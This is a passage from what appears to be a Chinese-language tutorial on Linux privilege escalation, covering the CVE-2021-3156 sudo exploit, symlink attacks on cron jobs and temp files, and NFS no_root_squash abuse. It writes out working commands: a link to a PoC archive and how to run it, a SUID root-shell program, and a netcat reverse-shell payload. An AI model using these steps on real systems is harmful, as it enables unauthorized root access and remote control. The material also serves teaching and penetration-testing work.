+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543436.png" alt><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543437.png" alt><br>
+之所以会产生这个漏洞，是因为将用户 ID 转换为用户名的函数会将 -1（或无效的4294967295)误认为是 0，而这正好是 root 用户 User ID</p>
+<h3 id="cve-2021-3156-提权">CVE-2021-3156 提权</h3>
+<p>原理如下：</p>
+<pre><code class="hljs scss">一个类 Unix 操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。
+
+当 sudo 通过 -s 或 -<span class="hljs-selector-tag">i</span> 命令行选项在 shell 模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用 -s 或 -<span class="hljs-selector-tag">i</span> 标志运行 sudoedit 时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在 sudoers 文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用 sudo 获得系统 root 权限。</code></pre>
+<p>影响范围：Sudo 1.8.2 - 1.8.31p2，Sudo 1.9.0 - 1.9.5p1<br>
+验证漏洞是否存在：</p>
+<pre><code class="hljs scss"><span class="hljs-number">1</span>.以非root用户身份登录系统。
+
+<span class="hljs-number">2</span>.运行命令“sudoedit -s /”
+
+<span class="hljs-number">3</span>.如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；
+
+如果出现以“ usage：”开头的错误响应，则表示该漏洞已被补丁修复。</code></pre>
+<p>漏洞poc：<a target="_blank" rel="noopener" href="https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz">https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</a><br>
+上传poc到目标服务器，给予权限，然后执行 <code>make &amp;&amp;./sudo-hax-me-a-sandwich 0</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543438.png" alt><br>
+用的是id为1000的test账户执行exp，执行完之后用户权限已经变成了root，成功提权，到这里所有的漏洞复现准备工作都做完了，接下来进行漏洞分析</p>
+<p>最后的提权是通过堆溢出覆盖nss_load_library函数加载so的时候需要用到的结构体service_user，覆盖此结构体中的so名字符串，这样就可以让程序加载我们指定的so文件，从而完成任意代码执行。</p>
+<h3 id="软连接提权">软连接提权</h3>
+<blockquote>
+<p>低权限用户能够以 root 用户的权限执行某个脚本，该脚本中又使用到了诸如&nbsp;<code>chown</code>&nbsp;等命令修改文件的权限，且该文件又能够被低权限的用户所修改。因此低权限的用户可以删除该文件，然后创建一个同名的文件，但是这个文件是指向一个高权用户才能修改的文件，例如&nbsp;<code>/etc/passwd</code>。这样在低权用户在执行命令的时候就能够修改&nbsp;<code>/etc/passwd</code>&nbsp;这个文件的权限了，这样就相当于低权限用户能够越权操作了。</p>
+</blockquote>
+<p>在Linux中，软连接（符号链接）提权是一种利用系统中的软连接或符号链接来提升权限的攻击技术。攻击者通过创建恶意的符号链接来欺骗系统，使得具有更高权限的进程访问或修改不该被其访问或修改的文件。以下是软连接提权的一些常见场景及具体例子：</p>
+<p><strong>软连接提权场景：</strong></p>
+<ol>
+<li>
+<p><strong>Cron作业</strong>：</p>
+<ul>
+<li>如果一个低权限用户能写入一个Cron作业，并且Cron作业由高权限用户（如root）执行，攻击者可以利用符号链接来操纵文件路径，从而提权。</li>
+</ul>
+</li>
+<li>
+<p><strong>临时文件</strong>：</p>
+<ul>
+<li>高权限进程使用固定路径的临时文件时，如果路径是可预测的，攻击者可以创建符号链接指向敏感文件，使高权限进程意外地覆盖这些文件。</li>
+</ul>
+</li>
+<li>
+<p><strong>备份或日志文件</strong>：</p>
+<ul>
+<li>当高权限用户执行备份或生成日志文件时，攻击者可以创建符号链接，使备份或日志文件写入到特权文件中。</li>
+</ul>
+</li>
+</ol>
+<h4 id="例1cron作业提权">例1：Cron作业提权</h4>
+<p>假设系统上有一个Cron作业由root用户定期执行，Cron作业的脚本如下：</p>
+<pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-built_in">cat</span> /etc/shadow &gt; /tmp/shadow_backup</code></pre>
+<p>攻击者可以利用这一点通过软连接提权：</p>
+<ol>
+<li><strong>低权限用户创建软连接</strong>：<pre><code class="hljs sh"><span class="hljs-built_in">ln</span> -s /etc/passwd /tmp/shadow_backup</code></pre>
+</li>
+<li><strong>等待Cron作业执行</strong>：<br>
+当Cron作业执行时，它会将 <code>/etc/shadow</code> 的内容写入 <code>/tmp/shadow_backup</code>，即 <code>/etc/passwd</code>，从而覆盖 <code>/etc/passwd</code> 文件，攻击者可以在覆盖后的文件中加入一个带root权限的用户。</li>
+<li><strong>结果</strong>：<br>
+root权限被提升，攻击者可以登录到系统并获得root权限。</li>
+</ol>
+<p>tips：当然或许也可以直接爆破root的hash密码了</p>
+<h4 id="例2临时文件提权">例2：临时文件提权</h4>
+<p>假设一个高权限脚本使用 <code>/tmp</code> 目录中的临时文件：</p>
+<pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-string">"Creating temporary file..."</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-string">"Temporary content"</span> &gt; /tmp/tempfile</code></pre>
+<p>攻击者可以利用这一点进行提权：</p>
+<ol>
+<li><strong>低权限用户创建软连接</strong>：<pre><code class="hljs sh"><span class="hljs-built_in">ln</span> -s /etc/shadow /tmp/tempfile</code></pre>
+</li>
+<li><strong>执行高权限脚本</strong>：<br>
+当高权限用户执行脚本时，内容会被写入 <code>/etc/shadow</code> 文件，从而破坏其内容，攻击者可以利用这一点。</li>
+<li><strong>结果</strong>：<br>
+高权限文件被修改，攻击者可能利用修改后的文件进一步提升权限。</li>
+</ol>
+<p>有一个案例如下：<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543439.png" alt></p>
+<p>发现laura可以以root身份无密码运行 /home/laura/test，但是目录下面并没有test，这个时候我们把/bin/bash给软连接或者拷贝过来：</p>
+<pre><code class="hljs scss">ln -s /bin/bash /home/laura/test</code></pre>
+<p>会发现我们可以sudo运行这个test导致了提权，这也是sudo的一个逻辑缺陷，sudo配置只关心程序的路径，而不关心程序是否会被修改。当然在大多数情况下，比如/usr/bin/find都是不可修改的只可以执行的，不会出现问题，而当错误配置时，就会引发这个逻辑漏洞导致提权<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543440.png" alt></p>
+<h2 id="nfs-提权">NFS 提权</h2>
+<h3 id="基础知识">基础知识</h3>
+<p>NFS 是一种运行在端口 2049 上的网络文件共享协议，由服务器和客户端两个组件组成。共享目录是在 NFS 服务器上创建的，以便可以通过网络与其他 Linux 客户端共享文件，获得许可的用户可以将文件添加到共享中，然后与有权访问该目录的其他用户共享。</p>
+<p>NFS是基于UDP/IP协议的应用，其实现主要是采用远程过程调用RPC机制，RPC提供了一组与机器、操作系统以及低层传送协议无关的存取远程文件的操作。RPC采用了XDR的支持。XDR是一种与机器无关的数据描述编码的协议，他以独立与任意机器体系结构的格式对网上传送的数据进行编码和解码，支持在异构系统之间数据的传送。</p>
+<p><strong>什么是root_sqaush和no_root_sqaush？</strong><br>
+默认情况下，每个 NFS 共享均启用了 root_squash 功能，用以防止被共享的文件拥有 root:root 身份或特殊权限（即启用 root_squash 之后，共享文件均是 nobody:nogroup 身份）。而如果启用了 no_root_squash 功能，那么共享文件就可以以 root 的身份存在，我们将在本篇文章中看到，这很容易导致权限升级。</p>
+<h3 id="nfs枚举">NFS枚举</h3>
+<p>网上找的例子如下：先枚举外部NFS共享</p>
+<p>nmap枚举：<code>nmap -A -sV -sC -T4 172.16.1.175 -p- -oN scan.nmap</code>，效果大致如下：<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543441.png" alt><br>
+好吧，NFS 共享的端口是 2049，但我们对端口 111 也很感兴趣，因为那是 NFS 服务绑定的 rpc 端口，现在我们可以枚举该服务。</p>
+<p>当然也可以使用showmount方式枚举：<code>showmount -e 172.16.1.175</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543442.png" alt><br>
+上图显示文件系统的根目录中有一个名为&nbsp;<strong>/share</strong>&nbsp;的共享文件夹，其次，我们可以看到该共享应用了两组特权。</p>
+<p>第一组权限仅为本地主机 (127.0.0.1/32) 设置，第二组权限为网络中的任何主机 (172.16.1.0/24) 设置。由于我们的攻击者计算机的 IP 地址为 172.16.1.30，因此我们可以与共享进行交互。</p>
+<p>或者，我们可以使用 nmap 对共享进行更深入的枚举。通过运行以下命令，我们可以运行 nmap 所有 NFS 相关的脚本：<code>nmap -sT -sV --script nfs* 172.16.1.175 -p111</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543443.png" alt><br>
+这比 showmount 命令的输出要详细得多，我们可以看到 nmap 实际上连接到了共享并列举了里面的文件。其中 /share 目录的所有权限都是 rwx，这意味着任何人都可以在其中读写；NoExecute 标志也已设置，因此我们无法执行共享中的任何二进制文件或脚本；共享里面只有一个文件：“welcome.txt”；其余信息还包含可以挂载共享的 IP 范围以及共享的可用空间。</p>
+<p>通过两种不同的方式枚举共享文件夹后，我们可以看到我们属于 172.16.1.0/24 网段，这意味着我们可以挂载此共享以查看 welcome.txt 文件，也可以尝试写入文件，在这里我们看看是否可以执行特权文件写入。</p>
+<h3 id="挂在nfs共享">挂在NFS共享</h3>
+<p>枚举完成后，我们现在可以专注于挂载共享。为此，我们可以测试几种不同的语法，以防其中一种不起作用。</p>
+<p>我们需要做的第一件事是在攻击者机器上创建一个挂载点，以便与共享进行交互。</p>
+<pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /mnt/share</code></pre>
+<p>创建挂载点后，我们就可以挂载共享并将其链接到挂载点。如果我们查看一下 nmap 扫描，就会发现它显示版本 2、3、4 都处于活动状态，因此让我们先尝试使用版本 2 进行挂载，因为它是最不安全的可用版本。</p>
+<pre><code class="hljs bash">mount -o rw,vers=2 172.16.1.175:/share /mnt/share</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543444.png" alt><br>
+我们得到的错误信息是不支持版本 2。因此，接下来我们需要测试版本 3，如果版本 3 也不支持，再测试版本 4。</p>
+<pre><code class="hljs bash">mount -o rw,vers=3 172.16.1.175:/share /mnt/share</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543445.png" alt><br>
+挂载成功，现在使用命令&nbsp;<strong>df -h</strong>&nbsp;查看所有挂载点，可以看到远程 172.16.1.175:/share 已挂载到本地 /mnt/share。<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543446.png" alt><br>
+现在，我们可以测试另一个命令。</p>
+<pre><code class="hljs bash">mount -t nfs 172.16.1.175:/share /mnt/share -vvvv</code></pre>
+<p>这将尝试挂载默认情况下可用的最新版本，并且 -vvvv 参数可用于非常详细的输出以查看是否有错误产生。<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543447.png" alt><br>
+我们可以看到此命令先是尝试使用版本 4 进行连接，但超时。不过，在上一个命令中说明版本 3 确实对我们有用，所以让我们继续。</p>
+<blockquote>
+<p>我只是想说明，如果前两个命令不起作用，你可以尝试使用不同的命令来挂载共享。此外，最后一个故障排除技巧是在挂载失败时使用 -vvvv 来尝试确定根本原因。</p>
+</blockquote>
+<p>此时，共享已挂载完成，导航进入 /mnt/share 文件夹后，我们准备新建一个文件以查看我们所拥有的权限。我们最感兴趣的是是否可以以 root 身份执行特权文件写入。<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543448.png" alt><br>
+不幸的是，当我们创建测试文件时，文件的所有者和组均为 nobody:nogroup。这意味着该共享已启用 root_squash。不过，我们还不能就此放弃，因为该共享还向 127.0.0.1/32 开放，而后者包含一组不同的权限，例如启用了 no_root_squash。</p>
+<p>为了进一步枚举此服务，我们需要在目标上立足。</p>
+<blockquote>
+<p>如果我们发现自己能够以 root 身份写入，这就意味着 no_root_squash 已启用，而此时我们甚至还没有在受害者机器建立立足点，就已经找到了特权升级的路径！如果是这种情况，我们可以先创建一个 SUID 二进制文件来提供一个 root shell，然后等获得了立足点，我们就可以执行它用以直接升级到 root！</p>
+</blockquote>
+<p>而现在，我们所能做的就是枚举此时共享内的文件，所以让我们看看 “welcome.txt” 有什么。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543449.png" alt><br>
+这告诉我们，新用户帐户的密码为&nbsp;<strong>P@ssw0rd</strong>，他们需要在 7 天内更改密码。</p>
+<h3 id="枚举内部nfs配置">枚举内部NFS配置</h3>
+<p>此时，假设我们已经获得了凭证并在目标上站稳了脚跟，接下来我们将了解如何手动和使用 LinPEAS 枚举 NFS 服务器配置。</p>
+<pre><code class="hljs css">ssh juggernaut<span class="hljs-keyword">@172</span>.16.1.175</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543450.png" alt><br>
+要手动枚举 NFS 服务器的配置，我们需要做的就是查看 NFS 访问控制列表 /etc/exports 文件的内容。</p>
+<pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/exports</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543451.png" alt><br>
+在这里，我们可以看到在这台服务器上，只有 /share 目录是共享的，而该目录有两个单独的条目。而令我们最感兴趣的是设置了 no_root_squash 的第二个条目设置。</p>
+<ul>
+<li><strong>rw</strong>：该选项允许客户端对卷进行读写操作。</li>
+<li><strong>sync</strong>：该选项强制 NFS 在回复前将更改写入磁盘。这将带来更稳定、更一致的环境，但会降低文件运行速度。</li>
+<li><strong>inescure</strong>：该选项允许客户端使用任何端口访问 NFS 共享。</li>
+<li><strong>no_subtree_check</strong>：该选项阻止子树检查，在该过程中主机必须检查该文件在每个请求的导出树中是否仍然可用。</li>
+<li><strong>no_root_squash</strong>：该选项允许在共享内以特权方式写入文件。默认情况下，NFS 会将远程 root 用户的请求转换为服务器上的非特权用户。这是一项安全功能，目的是防止客户端的 root 账户以 root 身份使用主机的文件系统 – no_root_squash 禁用了这一行为。</li>
+</ul>
+<p>第一个 /share 条目适用于外部 IP 客户端，在 ACL 设置中不包含 no_root_squash。这意味着 root_squash 是隐含的，这就是为什么我们的测试文件被写成 nobody:nogroup 的原因。如果启用了 no_root_squash，文件就会被写为 root。</p>
+<p>第二个 /share 条目确实启用了 no_root_squash，这意味着在本地访问共享将允许特权文件写入！<br>
+唯一的问题是：我们如何才能以 root 身份在本地与该共享交互，从而在其中写入恶意文件呢？– 很简单，我们使用端口转发！</p>
+<p>如果我们将该共享端口转发到攻击者机器，就能在攻击者机器内部挂载该共享。然后，由于我们在 “本地” 访问共享时是攻击者机器上的 root 用户，因此我们可以以 root 用户身份在内部编写恶意 SUID 可执行文件。之后，我们就可以用标准用户 juggernaut 执行该程序，并将我们的权限提升到 root。</p>
+<h3 id="端口转发nfs共享">端口转发NFS共享</h3>
+<p>如前所述，与本地共享进行交互的唯一方法是将其直接挂载在目标主机上，这需要我们已经是 root。但是，我们还可以通过另一种方法以 root 身份从 localhost 挂载此服务器。为此，我们需要利用端口转发。</p>
+<p>由于我们知道 NFS 共享在端口 2049 上运行，并且还知道 juggernaut 用户可以通过 SSH 访问系统，因此将此端口转发到攻击者计算机的最简单方法是执行本地端口转发。</p>
+<p>以下命令可用于将端口 2049 本地转发到我们的攻击者计算机：</p>
+<pre><code class="hljs kotlin">ssh -N -L <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">2049</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">2049</span> <span class="hljs-symbol">juggernaut@</span><span class="hljs-number">172.16</span><span class="hljs-number">.1</span><span class="hljs-number">.175</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543452.png" alt><br>
+看到提示挂起，说明端口转发成功；当我们在攻击者机器上打开一个新选项卡并运行&nbsp;<strong>netstat</strong>&nbsp;<strong>-tulpn</strong>&nbsp;命令时，我们应该看到端口 2049 在本地打开。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543453.png" alt><br>
+现在，我们可以与该服务进行交互，就好像它是在攻击者的机器上运行一样。最终，与我们远程和服务交互时不同，这次我们是在本地和服务交互，而 no_root_squash 已对 localhost 启用，所以我们可以以 root 身份写入文件了！</p>
+<h3 id="挂载-nfs-共享并提权">挂载 NFS 共享并提权</h3>
+<p><code>mount -t nfs -o port=2049 127.0.0.1:/share /mnt/share</code><br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543454.png" alt><br>
+共享挂载成功后，为了确认我们可以在共享中执行特权写入，我们需要创建一个测试文件。<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543455.png" alt><br>
+这次我们的测试文件是以 root 身份写入的！这意味着我们可以创建一个恶意二进制文件，或者将 /bin/bash 复制到共享中并设置 root:root 所有权和 SUID 权限，然后通过 SSH 返回受害者并使用 Juggernaut 执行它以提升我们的root权限！</p>
+<p>让我们看看如何提升为 root 用户的两个例子。</p>
+<h4 id="root-shell-制作漏洞利用程序">Root Shell 制作漏洞利用程序</h4>
+<p>为了制作自定义漏洞，我们可以使用以下命令：</p>
+<pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'int main() { setgid(0); setuid(0); system("/bin/bash -p"); return 0; }'</span> &gt; /mnt/share/root_shell.c</code></pre>
+<p>我们使用 setgid(0) 和 setuid(0) 来允许程序以 root 身份运行。需要注意的是，使用 msfvenom 制作的漏洞在这里不起作用，因为它没有设置这些标志。</p>
+<p>接下来，我们需要编译我们的漏洞利用程序，然后将其复制到共享中，并在共享后为其授予 SUID 权限。</p>
+<blockquote>
+<p>注意：您将看到一些警告，但这些不是错误，该文件应该编译没有任何问题。</p>
+</blockquote>
+<pre><code class="hljs shell">gcc ./root_shell.c -o ./root_shell
+cp root_shell /mnt/share/
+chmod +s /mnt/share/root_shell</code></pre>
+<p>完成后，我们可以检查 /mnt/share 文件夹以确认该二进制文件归 root 所有并设置了 SUID 位。<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543456.png" alt><br>
+我们可以看到权限集中的 “s”，并且二进制文件突出显示为红色，这表明 SUID 位已设置。</p>
+<p>接下来，我们需要做的就是通过 SSH 回到受害者并导航到共享文件夹，以确保从内部和外面看到的都是一样的。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543457.png" alt><br>
+通过 SSH 返回受害者后，我们可以看到漏洞正在等待我们，只需使用&nbsp;<strong>./root_shell</strong>&nbsp;执行它，我们就会进入 root shell。<br>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407241543458.png" alt></p>
+<blockquote>
+<p>如果您更喜欢反向 shell，请在制作漏洞利用程序时使用以下命令，然后在端口 443 上设置侦听器以在执行 shell 时捕获该 shell。</p>
+</blockquote>
+<pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'int main() { setgid(0); setuid(0); system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 172.16.1.30 443 &gt;/tmp/f"); return 0; }'</span> &gt; /mnt/share/root_reverse_shell.c</code></pre>
+<h4 id="root-shell-复制-binbash">Root Shell 复制 /bin/bash</h4>
+<p>进入 root shell 的一种更简单的方法是将 /bin/bash 复制到我们挂载的共享文件夹中，并将所有权更改为 root:root 并为其授予 SUID 权限。最后，我们只需要通过 SSH 作为 Juggernaut 返回受害者，然后执行 SUID bash 二进制文件以获得 root shell。</p>
+<blockquote>
+<p>第一步必须在受害者身上完成。我们不能将攻击者计算机上的 /bin/bash 复制到共享中，然后在受害者计算机上执行。这很可能行不通，因为很可能会出现内核和 bash 版本不匹配的情况。</p>
+</blockquote>
+<p>首先，我们需要作为 juggernaut 返回 SSH 会话，然后将 /bin/bash 复制到共享中。</p>
